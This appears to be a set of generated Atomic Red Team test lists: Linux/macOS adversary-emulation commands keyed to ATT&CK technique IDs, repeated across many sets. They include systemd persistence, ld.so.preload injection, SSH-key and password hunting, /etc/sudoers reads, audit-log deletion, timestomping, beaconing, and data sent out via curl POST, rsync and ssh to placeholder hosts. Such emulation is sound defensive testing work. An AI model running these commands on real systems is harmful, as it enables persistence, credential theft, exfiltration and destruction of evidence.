echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1136 ,T1064 ,T1081 ,T1057 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1215 ,T1154 ,T1040 ,T1217 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1215 ,T1064 ,T1145 ,T1135 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1501 ,T1154 ,T1145 ,T1069 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1069: Permission Groups Discovery
groups


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1158 ,T1154 ,T1081 ,T1057 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1501 ,T1153 ,T1040 ,T1087 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1136 ,T1153 ,T1040 ,T1018 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1501 ,T1064 ,T1139 ,T1201 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1158 ,T1064 ,T1040 ,T1057 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1501 ,T1153 ,T1040 ,T1135 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1158 ,T1154 ,T1145 ,T1082 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1206 ,T1215 ,T1064 ,T1139 ,T1087 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1158 ,T1153 ,T1081 ,T1033 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
